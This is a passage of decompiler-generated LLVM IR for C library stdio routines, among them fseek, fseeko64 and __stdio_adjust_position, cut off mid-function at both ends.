dec_label_pc_80505c2:                             ; preds = %dec_label_pc_80505b7
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v4_80505c8 = add i32 %v1_80505bb, %arg2
  %v5_80505c8 = inttoptr i32 %v4_80505c8 to i8*
  store i8 %v3_80505b3, i8* %v5_80505c8, align 1
  %v0_80505cb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80505cb = add i32 %v0_80505cb, 1
  store i32 %v1_80505cb, i32* %ebx.global-to-local, align 4
  %v0_80505cc = load i32, i32* @esi, align 4
  %v0_80505cd = load i32, i32* @edi, align 4
  %v0_80505ce = load i32, i32* %edx.global-to-local, align 4
  %v2_80505d0 = add i32 %v0_80505ce, %v1_80505cb
  %v5_80505d3 = inttoptr i32 %v2_80505d0 to i8*
  %v6_80505d3 = call i32 @memcpy(i8* %v5_80505d3, i32 %v0_80505cd, i32 %v0_80505cc)
  %v0_80505d8 = load i32, i32* @esi, align 4
  %v1_80505d8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80505d8 = add i32 %v1_80505d8, %v0_80505d8
  store i32 %v2_80505d8, i32* %ebx.global-to-local, align 4
  br i1 %v1_80505a0, label %dec_label_pc_80505ee, label %dec_label_pc_80505e2

dec_label_pc_80505e2:                             ; preds = %dec_label_pc_80505c2
  %v1_80505e2 = add i32 %v5_8050597, 1
  store i32 %v1_80505e2, i32* @edi, align 4
  %v1_80505e5 = icmp eq i32 %v1_80505e2, 0
  br i1 %v1_80505e5, label %dec_label_pc_80505ee, label %dec_label_pc_80505e9

dec_label_pc_80505e9:                             ; preds = %dec_label_pc_80505e9.lr.ph, %dec_label_pc_80505e2
  %v1_80505f914 = phi i32 [ 0, %dec_label_pc_80505e9.lr.ph ], [ %v2_80505d8, %dec_label_pc_80505e2 ]
  %v0_8050596 = phi i32 [ %v4_805058c, %dec_label_pc_80505e9.lr.ph ], [ %v1_80505e2, %dec_label_pc_80505e2 ]
  %v1_80505e9 = inttoptr i32 %v0_8050596 to i8*
  %v2_80505e9 = load i8, i8* %v1_80505e9, align 1
  %v3_80505e9 = icmp eq i8 %v2_80505e9, 0
  %v1_80505ec = icmp eq i1 %v3_80505e9, false
  br i1 %v1_80505ec, label %dec_label_pc_8050594, label %dec_label_pc_80505ee

dec_label_pc_80505ee:                             ; preds = %dec_label_pc_80505e2, %dec_label_pc_80505e9, %dec_label_pc_80505c2, %entry
  %v1_80505f9 = phi i32 [ 0, %entry ], [ %v2_80505d8, %dec_label_pc_80505e2 ], [ %v1_80505f914, %dec_label_pc_80505e9 ], [ %v2_80505d8, %dec_label_pc_80505c2 ]
  %tmp26 = icmp slt i32 %arg3, 1
  br i1 %tmp26, label %dec_label_pc_8050602, label %dec_label_pc_80505f5

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80505ee
  %v2_80505f9 = add i32 %v1_80505f9, %arg2
  %v3_80505f9 = inttoptr i32 %v2_80505f9 to i8*
  store i8 0, i8* %v3_80505f9, align 1
  %v0_80505fd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80505fd = add i32 %v0_80505fd, 1
  br label %dec_label_pc_8050605

dec_label_pc_8050602:                             ; preds = %dec_label_pc_80505b7, %dec_label_pc_80505b3, %dec_label_pc_80505ee
  br label %dec_label_pc_8050605

dec_label_pc_8050605:                             ; preds = %dec_label_pc_80505f5, %dec_label_pc_8050602
  %storemerge = phi i32 [ %v1_80505fd, %dec_label_pc_80505f5 ], [ -1, %dec_label_pc_8050602 ]
  %v2_8050605 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050605, i32* @ebx, align 4
  store i32 %v0_805058a, i32* @esi, align 4
  store i32 %v0_8050589, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v1_80505e9, { 1, 0 }
  uselistorder i1 %v1_80505a0, { 1, 0 }
  uselistorder i32 %v5_8050597, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 (i8*, i32, i32)* @memcpy, { 7, 0, 1, 8, 2, 3, 14, 9, 10, 11, 12, 13, 4, 15, 16, 5, 6 }
  uselistorder i32 (i8*)* @strlen, { 13, 12, 18, 17, 16, 19, 11, 10, 7, 9, 15, 14, 0, 6, 5, 4, 2, 3, 1, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 4, 7, 5, 6, 8, 9, 10, 0, 1, 2, 3 }
  uselistorder i32 46, { 0, 3, 1, 2 }
  uselistorder i8* null, { 2, 5, 3, 6, 8, 0, 7, 1, 9, 10, 4 }
  uselistorder label %dec_label_pc_8050605, { 1, 0 }
  uselistorder label %dec_label_pc_8050602, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80505ee, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80505e9, { 1, 0 }
  uselistorder label %dec_label_pc_80505b3, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8050614 = ashr i32 %arg2, 31
  %v4_805061b = inttoptr i32 %arg1 to i16*
  %v5_805061b = call i32 @__GI_fseeko64(i16* %v4_805061b, i32 %arg2, i32 %v1_8050614, i32 %arg3)
  ret i32 %v5_805061b

; uselistorder directives
  uselistorder i32 31, { 3, 4, 5, 6, 7, 9, 10, 8, 1, 0, 15, 11, 12, 13, 2, 14 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8050624 = load i32, i32* @ebp, align 4
  %v0_8050625 = load i32, i32* @edi, align 4
  %v0_8050626 = load i32, i32* @esi, align 4
  %v0_8050627 = load i32, i32* @ebx, align 4
  %v15_8050628 = ptrtoint i32* %stack_var_-40 to i32
  %v4_805062b = ptrtoint i16* %arg1 to i32
  store i32 %v4_805062b, i32* @esi, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %tmp29 = icmp ult i32 %arg4, 3
  br i1 %tmp29, label %dec_label_pc_805065b, label %dec_label_pc_8050648

dec_label_pc_8050648:                             ; preds = %entry
  %v1_8050648 = call i32 @__GI___errno_location(i32 %arg2)
  store i32 %v1_8050648, i32* %eax.global-to-local, align 4
  %v1_805064d = inttoptr i32 %v1_8050648 to i32*
  store i32 22, i32* %v1_805064d, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80506f5

dec_label_pc_805065b:                             ; preds = %entry
  %v1_805065b = add i32 %v4_805062b, 52
  %v2_805065b = inttoptr i32 %v1_805065b to i32*
  %v3_805065b = load i32, i32* %v2_805065b, align 4
  %v4_805065b = icmp eq i32 %v3_805065b, 0
  %v1_805065f = zext i1 %v4_805065b to i32
  %v3_805065f = and i32 %arg2, -256
  %v4_805065f = or i32 %v1_805065f, %v3_805065f
  store i32 %v4_805065f, i32* %eax.global-to-local, align 4
  %v1_8050665 = icmp eq i1 %v4_805065b, false
  br i1 %v1_8050665, label %dec_label_pc_8050685, label %dec_label_pc_8050669

dec_label_pc_8050669:                             ; preds = %dec_label_pc_805065b
  %v1_8050669 = add i32 %v4_805062b, 56
  store i32 %v1_8050669, i32* @ebx, align 4
  store i32 %v15_8050628, i32* %eax.global-to-local, align 4
  %v7_8050677 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134525440, i32 %v1_8050669)
  store i32 %v7_8050677, i32* %eax.global-to-local, align 4
  %v0_805067c = load i32, i32* @ebx, align 4
  %v1_805067d = call i32 @__pthread_return_0(i32 %v0_805067c)
  store i32 %v1_805067d, i32* %eax.global-to-local, align 4
  %v0_8050685.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050685

dec_label_pc_8050685:                             ; preds = %dec_label_pc_805065b, %dec_label_pc_8050669
  %v0_805068a = phi i32 [ %v4_805062b, %dec_label_pc_805065b ], [ %v0_8050685.pre, %dec_label_pc_8050669 ]
  %v1_8050685 = inttoptr i32 %v0_805068a to i8*
  %v2_8050685 = load i8, i8* %v1_8050685, align 1
  %v3_8050685 = and i8 %v2_8050685, 64
  %v4_8050685 = icmp eq i8 %v3_8050685, 0
  br i1 %v4_8050685, label %dec_label_pc_8050695, label %dec_label_pc_805068a

dec_label_pc_805068a:                             ; preds = %dec_label_pc_8050685
  %v2_805068b = call i32 @__stdio_wcommit(i32 %v0_805068a)
  store i32 %v2_805068b, i32* %eax.global-to-local, align 4
  %v1_8050691 = icmp eq i32 %v2_805068b, 0
  %v1_8050693 = icmp eq i1 %v1_8050691, false
  br i1 %v1_8050693, label %dec_label_pc_80506e3, label %dec_label_pc_8050695

dec_label_pc_8050695:                             ; preds = %dec_label_pc_805068a, %dec_label_pc_8050685
  %v0_8050695 = load i32, i32* @edi, align 4
  %v9_8050695 = icmp eq i32 %v0_8050695, 1
  %v1_8050698 = icmp eq i1 %v9_8050695, false
  %.pre6 = ptrtoint i32* %stack_var_-24 to i32
  br i1 %v1_8050698, label %dec_label_pc_8050695.dec_label_pc_80506ab_crit_edge, label %dec_label_pc_805069a

dec_label_pc_8050695.dec_label_pc_80506ab_crit_edge: ; preds = %dec_label_pc_8050695
  br label %dec_label_pc_80506ab

dec_label_pc_805069a:                             ; preds = %dec_label_pc_8050695
  store i32 %.pre6, i32* %eax.global-to-local, align 4
  %v0_805069f = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_805069f to i32*
  %v5_80506a0 = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %.pre6)
  store i32 %v5_80506a0, i32* %eax.global-to-local, align 4
  %v3_80506a6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v3_80506a6, i32* @ebx, align 4
  %v2_80506a7 = icmp slt i32 %v5_80506a0, 0
  br i1 %v2_80506a7, label %dec_label_pc_80506e3, label %dec_label_pc_805069a.dec_label_pc_80506ab_crit_edge

dec_label_pc_805069a.dec_label_pc_80506ab_crit_edge: ; preds = %dec_label_pc_805069a
  %v0_80506ab.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80506ab

dec_label_pc_80506ab:                             ; preds = %dec_label_pc_8050695.dec_label_pc_80506ab_crit_edge, %dec_label_pc_805069a.dec_label_pc_80506ab_crit_edge
  %v0_80506ab = phi i32 [ %v0_8050695, %dec_label_pc_8050695.dec_label_pc_80506ab_crit_edge ], [ %v0_80506ab.pre, %dec_label_pc_805069a.dec_label_pc_80506ab_crit_edge ]
  store i32 %.pre6, i32* %eax.global-to-local, align 4
  %v0_80506b1 = load i32, i32* @esi, align 4
  %v7_80506b2 = call i32 @__stdio_seek(i32 %v0_80506b1, i32* nonnull %stack_var_-24, i32 %v0_80506ab)
  store i32 %v7_80506b2, i32* %eax.global-to-local, align 4
  %v2_80506ba = icmp slt i32 %v7_80506b2, 0
  br i1 %v2_80506ba, label %dec_label_pc_80506e3, label %dec_label_pc_80506be

dec_label_pc_80506be:                             ; preds = %dec_label_pc_80506ab
  %v0_80506be = load i32, i32* @esi, align 4
  %v1_80506be = inttoptr i32 %v0_80506be to i16*
  %v2_80506be = load i16, i16* %v1_80506be, align 2
  %v3_80506be = and i16 %v2_80506be, -72
  store i16 %v3_80506be, i16* %v1_80506be, align 2
  %v0_80506c2 = load i32, i32* @esi, align 4
  %v1_80506c2 = add i32 %v0_80506c2, 8
  %v2_80506c2 = inttoptr i32 %v1_80506c2 to i32*
  %v3_80506c2 = load i32, i32* %v2_80506c2, align 4
  store i32 %v3_80506c2, i32* %eax.global-to-local, align 4
  %v2_80506c5 = add i32 %v0_80506c2, 16
  %v3_80506c5 = inttoptr i32 %v2_80506c5 to i32*
  store i32 %v3_80506c2, i32* %v3_80506c5, align 4
  %v0_80506c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506c8 = load i32, i32* @esi, align 4
  %v2_80506c8 = add i32 %v1_80506c8, 20
  %v3_80506c8 = inttoptr i32 %v2_80506c8 to i32*
  store i32 %v0_80506c8, i32* %v3_80506c8, align 4
  %v0_80506cb = load i32, i32* %eax.global-to-local, align 4
  %v1_80506cb = load i32, i32* @esi, align 4
  %v2_80506cb = add i32 %v1_80506cb, 24
  %v3_80506cb = inttoptr i32 %v2_80506cb to i32*
  store i32 %v0_80506cb, i32* %v3_80506cb, align 4
  %v0_80506ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80506ce = load i32, i32* @esi, align 4
  %v2_80506ce = add i32 %v1_80506ce, 28
  %v3_80506ce = inttoptr i32 %v2_80506ce to i32*
  store i32 %v0_80506ce, i32* %v3_80506ce, align 4
  %v0_80506d1 = load i32, i32* @esi, align 4
  %v1_80506d1 = add i32 %v0_80506d1, 44
  %v2_80506d1 = inttoptr i32 %v1_80506d1 to i32*
  store i32 0, i32* %v2_80506d1, align 4
  %v0_80506d8 = load i32, i32* @esi, align 4
  %v1_80506d8 = add i32 %v0_80506d8, 2
  %v2_80506d8 = inttoptr i32 %v1_80506d8 to i8*
  store i8 0, i8* %v2_80506d8, align 1
  br label %dec_label_pc_80506e3

dec_label_pc_80506e3:                             ; preds = %dec_label_pc_805068a, %dec_label_pc_805069a, %dec_label_pc_80506ab, %dec_label_pc_80506be
  %storemerge = phi i32 [ 0, %dec_label_pc_80506be ], [ -1, %dec_label_pc_80506ab ], [ -1, %dec_label_pc_805069a ], [ -1, %dec_label_pc_805068a ]
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  br i1 %v1_8050665, label %dec_label_pc_80506f5, label %dec_label_pc_80506e7

dec_label_pc_80506e7:                             ; preds = %dec_label_pc_80506e3
  store i32 %v15_8050628, i32* %eax.global-to-local, align 4
  %v5_80506ee = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  %v3_80506f3 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_80506f3, i32* %eax.global-to-local, align 4
  %v0_80506f5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80506f5

dec_label_pc_80506f5:                             ; preds = %dec_label_pc_80506e3, %dec_label_pc_8050648, %dec_label_pc_80506e7
  %v0_80506f5 = phi i32 [ %storemerge, %dec_label_pc_80506e3 ], [ -1, %dec_label_pc_8050648 ], [ %v0_80506f5.pre, %dec_label_pc_80506e7 ]
  store i32 %v0_80506f5, i32* %eax.global-to-local, align 4
  store i32 %v0_8050627, i32* @ebx, align 4
  store i32 %v0_8050626, i32* @esi, align 4
  store i32 %v0_8050625, i32* @edi, align 4
  store i32 %v0_8050624, i32* @ebp, align 4
  ret i32 %v0_80506f5

; uselistorder directives
  uselistorder i32 %v0_80506f5, { 1, 0 }
  uselistorder i32 %.pre6, { 1, 0, 2 }
  uselistorder i32 %v0_8050695, { 1, 0 }
  uselistorder i1 %v4_805065b, { 1, 0 }
  uselistorder i32 %v15_8050628, { 1, 0 }
  uselistorder i32 (i32*, i32)* @_pthread_cleanup_pop_restore, { 0, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 19, 20, 1, 2, 23, 7, 3, 4, 5, 21, 22 }
  uselistorder i32 28, { 12, 13, 31, 32, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 9, 35, 36, 5, 0, 1, 37, 38, 39, 40, 41, 3, 42, 43, 7, 44, 45, 46, 6, 47, 48, 25, 26, 49, 27, 28, 33, 34, 29, 30, 50, 51, 52, 53, 4, 8, 54, 55, 56, 57, 10, 11 }
  uselistorder i32 24, { 8, 9, 24, 25, 26, 10, 11, 12, 13, 14, 15, 16, 1, 30, 29, 0, 31, 32, 17, 18, 27, 28, 19, 20, 5, 35, 36, 37, 33, 34, 38, 39, 40, 41, 42, 43, 44, 45, 6, 46, 2, 47, 21, 3, 22, 4, 23, 7 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 0, { 35, 36, 83, 84, 85, 37, 38, 39, 40, 41, 42, 43, 0, 1, 44, 45, 31, 46, 47, 48, 49, 50, 51, 52, 53, 2, 54, 55, 3, 56, 57, 58, 59, 60, 61, 62, 63, 33, 64, 86, 87, 90, 91, 92, 98, 96, 97, 4, 94, 95, 93, 5, 99, 100, 101, 103, 104, 105, 65, 66, 106, 108, 8, 107, 7, 6, 110, 109, 9, 111, 128, 129, 130, 112, 118, 119, 22, 11, 80, 79, 10, 13, 132, 131, 12, 133, 14, 81, 82, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 153, 149, 150, 151, 152, 15, 154, 155, 167, 88, 23, 32, 89, 16, 114, 113, 24, 67, 169, 157, 158, 159, 160, 161, 162, 163, 164, 165, 25, 166, 156, 102, 168, 68, 17, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 115, 116, 117, 120, 121, 126, 125, 18, 122, 123, 20, 124, 19, 127, 21, 34, 26, 27, 28, 29, 30 }
  uselistorder i8 64, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 22, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 0, 8, 7, 27, 26, 4, 21, 25, 24, 23, 3, 2, 1, 6, 5 }
  uselistorder i32 (i32*, i32, i32)* @_pthread_cleanup_push_defer, { 0, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 19, 20, 1, 2, 23, 7, 3, 4, 5, 21, 22 }
  uselistorder i32 134525440, { 0, 24, 1, 2, 20, 21, 3, 22, 4, 5, 6, 7, 8, 23, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 56, { 2, 0, 8, 9, 3, 4, 7, 5, 6, 10, 11, 12, 13, 14, 15, 19, 16, 17, 18, 20, 21, 1 }
  uselistorder i32 -256, { 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 1, 38, 39, 2, 40, 41, 42, 43, 64, 3, 63, 4, 65, 67, 44, 68, 69, 7, 6, 5, 71, 70, 8, 83, 45, 75, 9, 84, 11, 58, 57, 10, 13, 86, 85, 12, 87, 88, 89, 90, 92, 91, 14, 93, 94, 98, 59, 60, 61, 62, 15, 46, 72, 47, 48, 100, 96, 97, 95, 66, 99, 49, 51, 50, 52, 16, 53, 54, 55, 56, 74, 73, 80, 77, 18, 78, 19, 79, 17, 76, 20, 81, 82 }
  uselistorder i32 52, { 2, 12, 0, 13, 14, 15, 3, 4, 5, 6, 7, 10, 11, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 25, 26 }
  uselistorder i32 22, { 5, 6, 7, 15, 16, 8, 1, 2, 14, 0, 17, 18, 9, 4, 19, 3, 10, 11, 12, 13 }
  uselistorder i32* @esi, { 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 5, 48, 49, 180, 181, 182, 29, 183, 50, 51, 52, 53, 54, 55, 6, 56, 57, 58, 59, 60, 61, 62, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 7, 79, 80, 0, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 27, 102, 103, 104, 108, 109, 30, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 8, 120, 121, 122, 123, 35, 36, 37, 105, 1, 106, 107, 124, 125, 126, 127, 202, 203, 204, 205, 206, 207, 208, 209, 9, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 247, 248, 249, 250, 251, 11, 10, 128, 129, 130, 131, 132, 139, 133, 134, 135, 136, 137, 138, 252, 12, 253, 254, 255, 256, 257, 258, 259, 260, 261, 140, 141, 142, 143, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 305, 306, 307, 31, 308, 13, 3, 309, 175, 176, 177, 178, 179, 274, 275, 310, 14, 4, 311, 312, 15, 313, 314, 315, 28, 316, 317, 318, 319, 320, 321, 16, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 17, 343, 344, 345, 346, 347, 348, 349, 18, 19, 350, 351, 352, 382, 144, 145, 20, 146, 147, 148, 149, 150, 151, 152, 158, 159, 21, 153, 154, 155, 156, 157, 160, 161, 162, 383, 384, 385, 170, 171, 172, 386, 387, 388, 399, 400, 395, 396, 397, 398, 22, 32, 33, 34, 353, 389, 23, 390, 24, 391, 392, 393, 394, 163, 164, 165, 166, 167, 276, 277, 278, 2, 279, 280, 281, 168, 169, 354, 358, 25, 359, 360, 361, 362, 363, 364, 365, 366, 355, 356, 357, 367, 368, 369, 370, 371, 372, 373, 374, 26, 375, 376, 377, 378, 379, 380, 381, 245, 246, 282, 283, 173, 174, 284, 285 }
  uselistorder i32* @edi, { 16, 3, 17, 18, 19, 112, 113, 114, 115, 116, 117, 118, 20, 21, 22, 23, 24, 25, 26, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 27, 28, 29, 30, 31, 32, 33, 34, 35, 14, 36, 37, 38, 39, 40, 41, 42, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0, 58, 59, 4, 15, 43, 5, 44, 45, 60, 61, 62, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 6, 164, 165, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 80, 76, 77, 78, 79, 166, 1, 167, 168, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 169, 170, 171, 172, 173, 174, 175, 176, 109, 110, 111, 7, 198, 199, 200, 8, 201, 202, 203, 204, 205, 206, 207, 9, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 11, 222, 223, 224, 10, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 256, 257, 258, 92, 93, 94, 95, 96, 97, 98, 99, 284, 285, 286, 100, 101, 102, 103, 104, 105, 106, 177, 178, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 2, 274, 275, 276, 12, 277, 278, 279, 13, 280, 281, 282, 283, 254, 255, 107, 108, 179, 180, 181, 182 }
  uselistorder i32* @ebp, { 10, 11, 12, 13, 14, 15, 16, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 2, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 7, 8, 9, 27, 28, 29, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 3, 90, 91, 92, 93, 94, 95, 96, 42, 43, 4, 44, 45, 46, 1, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 129, 130, 131, 132, 133, 134, 135, 136, 107, 108, 109, 110, 111, 112, 113, 114, 137, 0, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 159, 156, 157, 158, 160, 161, 193, 194, 195, 196, 47, 48, 49, 50, 115, 116, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 5, 188, 6, 189, 190, 191, 192, 51, 52, 53, 54, 55, 56, 57, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80506f5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80506e3, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80506ab, { 1, 0 }
  uselistorder label %dec_label_pc_8050685, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050703 = load i32, i32* @ebx, align 4
  store i32 %v0_8050703, i32* %stack_var_-16, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v2_8050708 = load i32, i32* %arg1, align 4
  store i32 %v2_8050708, i32* %esi.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8050711 = urem i32 %v2_8050708, 4
  %v2_8050711 = icmp eq i32 %v1_8050711, 0
  store i32 %v1_8050711, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050711, label %dec_label_pc_805073d, label %dec_label_pc_8050716

dec_label_pc_8050716:                             ; preds = %entry
  %v1_8050718 = add nsw i32 %v1_8050711, -1
  %v8_8050718 = icmp eq i32 %v1_8050718, 0
  store i32 %v1_8050718, i32* %edx.global-to-local, align 4
  br i1 %v8_8050718, label %dec_label_pc_805073d, label %dec_label_pc_805071b

dec_label_pc_805071b:                             ; preds = %dec_label_pc_8050716
  %v3_805071b = and i32 %v2_8050708, 2048
  %v4_805071b = icmp eq i32 %v3_805071b, 0
  br i1 %v4_805071b, label %dec_label_pc_805073d, label %dec_label_pc_8050720

dec_label_pc_8050720:                             ; preds = %dec_label_pc_805071b
  %v9_8050720 = icmp eq i32 %v1_8050711, 3
  br i1 %v9_8050720, label %dec_label_pc_805078f, label %dec_label_pc_8050725

dec_label_pc_8050725:                             ; preds = %dec_label_pc_8050720
  %v1_8050725 = add i32 %tmp4, 40
  %v2_8050725 = inttoptr i32 %v1_8050725 to i32*
  %v3_8050725 = load i32, i32* %v2_8050725, align 4
  %v4_8050725 = icmp eq i32 %v3_8050725, 0
  %v1_8050729 = icmp eq i1 %v4_8050725, false
  br i1 %v1_8050729, label %dec_label_pc_805078f, label %dec_label_pc_805072b

dec_label_pc_805072b:                             ; preds = %dec_label_pc_8050725
  %v1_805072b = add i32 %tmp4, 3
  %v2_805072b = inttoptr i32 %v1_805072b to i8*
  %v3_805072b = load i8, i8* %v2_805072b, align 1
  %v4_805072b = zext i8 %v3_805072b to i32
  %v1_805072f = sub nsw i32 0, %v4_805072b
  store i32 %v1_805072f, i32* %edx.global-to-local, align 4
  %v1_8050731 = add i32 %tmp4, 44
  %v2_8050731 = inttoptr i32 %v1_8050731 to i32*
  %v3_8050731 = load i32, i32* %v2_8050731, align 4
  %tmp10 = icmp slt i32 %v3_8050731, 1
  br i1 %tmp10, label %dec_label_pc_805073d, label %dec_label_pc_8050737

dec_label_pc_8050737:                             ; preds = %dec_label_pc_805072b
  %v1_8050737 = add i32 %tmp4, 2
  %v2_8050737 = inttoptr i32 %v1_8050737 to i8*
  %v3_8050737 = load i8, i8* %v2_8050737, align 1
  %v4_8050737 = zext i8 %v3_8050737 to i32
  %v2_805073b = sub nsw i32 %v1_805072f, %v4_8050737
  store i32 %v2_805073b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805073d

dec_label_pc_805073d:                             ; preds = %dec_label_pc_805072b, %dec_label_pc_805071b, %dec_label_pc_8050716, %entry, %dec_label_pc_8050737
  %v0_805074c = phi i32 [ %v1_805072f, %dec_label_pc_805072b ], [ %v1_8050718, %dec_label_pc_805071b ], [ 0, %dec_label_pc_8050716 ], [ 0, %entry ], [ %v2_805073b, %dec_label_pc_8050737 ]
  %v2_805073d = and i32 %v2_8050708, 64
  %v3_805073d = icmp eq i32 %v2_805073d, 0
  %storemerge.in.in.v = select i1 %v3_805073d, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp4
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_805074c = add i32 %tmp4, 16
  %v3_805074c = inttoptr i32 %v2_805074c to i32*
  %v4_805074c = load i32, i32* %v3_805074c, align 4
  %v5_805074c = sub i32 %v0_805074c, %v4_805074c
  store i32 %v5_805074c, i32* %edx.global-to-local, align 4
  %v2_805074f = add i32 %v5_805074c, %storemerge
  store i32 %v2_805074f, i32* %esi.global-to-local, align 4
  %v1_8050756 = inttoptr i32 %arg2 to i32*
  %v2_8050756 = load i32, i32* %v1_8050756, align 4
  store i32 %v2_8050756, i32* %ecx.global-to-local, align 4
  %v1_8050758 = add i32 %arg2, 4
  %v2_8050758 = inttoptr i32 %v1_8050758 to i32*
  %v3_8050758 = load i32, i32* %v2_8050758, align 4
  store i32 %v3_8050758, i32* %ebx.global-to-local, align 4
  %v2_8050762 = sub i32 %v2_8050756, %v2_805074f
  %v7_8050762 = icmp ult i32 %v2_8050756, %v2_805074f
  store i32 %v2_8050762, i32* %edi.global-to-local, align 4
  %v3_8050764 = zext i1 %v7_8050762 to i32
  %tmp = icmp slt i32 %v2_805074f, 0
